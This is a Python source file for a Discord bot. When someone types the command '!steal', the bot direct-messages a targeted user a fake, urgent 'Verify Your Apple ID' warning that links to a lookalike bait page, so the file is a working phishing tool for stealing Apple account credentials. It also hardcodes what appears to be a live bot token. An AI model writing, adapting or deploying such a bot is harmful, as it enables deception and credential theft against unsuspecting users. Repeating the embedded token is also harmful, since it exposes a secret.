import discord
import os
from flask import Flask
from threading import Thread

# Flask web server for keeping the Codespace alive
app = Flask('')
@app.route('/')
def home():
    return "Bot alive"

def run_web():
    app.run(host='0.0.0.0', port=8000)

Thread(target=run_web).start()

# --- EDIT THESE TWO LINES ---
TOKEN = "MTUxNjM3OTAxMzA3MjAzMTc4NA.GIyLVe.00RP6tundagM2Ju8eTpazxS7PVSQ0kIRak1kAg"
BAIT_URL = "https://k33mr3b0rn.github.io/apple-vefify/"   # your exact bait link
# ----------------------------

class MyClient(discord.Client):
    async def on_ready(self):
        print(f"Bot online as {self.user}")

    async def on_message(self, message):
        if message.author == self.user:
            return
        if message.content.startswith("!steal"):
            target = message.mentions[0] if message.mentions else message.author
            embed = discord.Embed(
                title="⚠️ Urgent: Verify Your Apple ID",
                description="Tap the link below to secure your account. Expires in 5 min.",
                color=0xff0000
            )
            embed.add_field(name="Verification", value=f"[Tap Here]({BAIT_URL})")
            try:
                await target.send(embed=embed)
                await message.channel.send(f"✅ Sent to {target.name}")
            except discord.Forbidden:
                await message.channel.send("❌ Cannot DM that user.")

intents = discord.Intents.default()
intents.message_content = True   # works fine in Codespaces (Python 3.10)
client = MyClient(intents=intents)
client.run(TOKEN)
